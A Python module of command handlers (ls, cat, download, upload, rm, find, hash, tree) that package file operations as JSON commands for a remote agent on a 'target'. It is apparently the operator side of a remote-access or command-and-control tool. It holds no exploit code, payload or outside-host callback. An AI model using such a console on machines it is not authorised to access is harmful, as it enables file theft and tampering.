import os, json, base64, hashlib, shutil, stat
from datetime import datetime

def cmd_ls(session, args):
    """List directory contents."""
    path = ' '.join(args) if args else '.'
    
    # Use agent's file manager
    return {
        'type': 'command',
        'command': 'ls',
        'data': path
    }

def cmd_cd(session, args):
    """Change directory."""
    if not args:
        return {"error": "Usage: cd <directory>"}
    
    path = ' '.join(args)
    return {
        'type': 'command',
        'command': 'cd',
        'data': path
    }

def cmd_pwd(session, args):
    """Print working directory."""
    return {
        'type': 'command',
        'command': 'pwd',
        'data': ''
    }

def cmd_cat(session, args):
    """View file contents."""
    if not args:
        return {"error": "Usage: cat <file>"}
    
    filepath = ' '.join(args)
    return {
        'type': 'command',
        'command': 'cat',
        'data': filepath
    }

def cmd_download(session, args):
    """Download file from target."""
    if len(args) < 1:
        return {"error": "Usage: download <remote_file> [local_name]"}
    
    remote_file = args[0]
    local_name = args[1] if len(args) > 1 else os.path.basename(remote_file)
    
    return {
        'type': 'command',
        'command': 'download',
        'data': json.dumps({
            'remote': remote_file,
            'local': local_name
        })
    }

def cmd_upload(session, args):
    """Upload file to target."""
    if len(args) < 1:
        return {"error": "Usage: upload <local_file> [remote_path]"}
    
    local_file = args[0]
    remote_path = args[1] if len(args) > 1 else os.path.basename(local_file)
    
    # Check if local file exists
    if not os.path.exists(local_file):
        return {"error": f"Local file not found: {local_file}"}
    
    # Read file content
    try:
        with open(local_file, 'rb') as f:
            file_content = base64.b64encode(f.read()).decode()
        
        return {
            'type': 'command',
            'command': 'upload',
            'data': json.dumps({
                'filename': os.path.basename(remote_path),
                'path': remote_path,
                'content': file_content,
                'size': len(file_content)
            })
        }
    except Exception as e:
        return {"error": f"Failed to read file: {str(e)}"}

def cmd_rm(session, args):
    """Remove file or directory."""
    if not args:
        return {"error": "Usage: rm <file_or_directory>"}
    
    path = ' '.join(args)
    force = '-f' in args or '--force' in args
    
    return {
        'type': 'command',
        'command': 'rm',
        'data': json.dumps({
            'path': path,
            'force': force
        })
    }

def cmd_find(session, args):
    """Find files."""
    if not args:
        return {"error": "Usage: find <pattern> [search_path]"}
    
    pattern = args[0]
    search_path = args[1] if len(args) > 1 else '.'
    recursive = '-r' not in args  # Default to recursive
    
    return {
        'type': 'command',
        'command': 'find',
        'data': json.dumps({
            'pattern': pattern,
            'path': search_path,
            'recursive': recursive
        })
    }

def cmd_hash(session, args):
    """Calculate file hash."""
    if not args:
        return {"error": "Usage: hash <file> [algorithm]"}
    
    filepath = args[0]
    algorithm = args[1] if len(args) > 1 else 'sha256'
    
    return {
        'type': 'command',
        'command': 'hash',
        'data': json.dumps({
            'file': filepath,
            'algorithm': algorithm
        })
    }

def cmd_tree(session, args):
    """Show directory tree."""
    path = args[0] if args else '.'
    depth = 3  # Default depth
    
    # Parse depth argument
    for i, arg in enumerate(args):
        if arg == '-d' and i + 1 < len(args):
            try:
                depth = int(args[i + 1])
            except:
                pass
    
    return {
        'type': 'command',
        'command': 'tree',
        'data': json.dumps({
            'path': path,
            'depth': depth
        })
    }